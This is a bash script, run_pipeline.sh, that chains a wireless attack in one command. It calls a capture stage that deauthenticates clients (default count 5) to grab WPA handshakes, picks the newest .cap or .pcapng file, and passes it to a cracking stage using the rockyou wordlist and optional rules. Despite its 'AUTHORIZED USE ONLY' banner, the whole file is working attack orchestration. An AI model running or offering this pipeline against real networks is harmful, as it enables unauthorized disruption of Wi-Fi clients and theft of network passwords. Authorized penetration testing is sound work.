#!/usr/bin/env bash
#
# run_pipeline.sh — chains Stage 2 (capture) -> Stage 3 (crack) in one command.
#
# ===========================================================================
#  AUTHORIZED USE ONLY.
# ===========================================================================
#
# Usage:
#   sudo ./run_pipeline.sh -i wlan1 -m capture_manifest.json \
#        -w /usr/share/wordlists/rockyou.txt
#
set -uo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"

IFACE=""; MANIFEST=""; WORDLIST="/usr/share/wordlists/rockyou.txt"
RULES=""; TIMEOUT=300; DEAUTH=5

usage(){ echo "Usage: sudo $0 -i IFACE -m MANIFEST [-w WORDLIST] [-r RULES] [-t SECS] [-d DEAUTH]"; exit "${1:-0}"; }
while getopts "i:m:w:r:t:d:h" opt; do case "$opt" in
  i) IFACE="$OPTARG";; m) MANIFEST="$OPTARG";; w) WORDLIST="$OPTARG";;
  r) RULES="$OPTARG";; t) TIMEOUT="$OPTARG";; d) DEAUTH="$OPTARG";; h) usage 0;; *) usage 1;;
esac; done

[[ $EUID -eq 0 ]] || { echo "Run as root (sudo)."; exit 1; }
[[ -n "$IFACE" && -n "$MANIFEST" ]] || usage 1

echo "==== STAGE 2: CAPTURE ===="
"$HERE/capture.sh" -i "$IFACE" -m "$MANIFEST" -t "$TIMEOUT" -d "$DEAUTH" || {
  echo "Capture stage reported no handshake; checking for any capture files anyway..."; }

# pick the newest .cap or .pcapng produced
CAP=$(ls -1t ./captures/*.cap ./captures/*.pcapng 2>/dev/null | head -1)
[[ -n "$CAP" ]] || { echo "No capture file produced. Stopping."; exit 2; }

echo
echo "==== STAGE 3: CRACK ($CAP) ===="
CRACK_ARGS=(-c "$CAP" -w "$WORDLIST")
[[ -n "$RULES" ]] && CRACK_ARGS+=(-r "$RULES")
"$HERE/crack.sh" "${CRACK_ARGS[@]}"
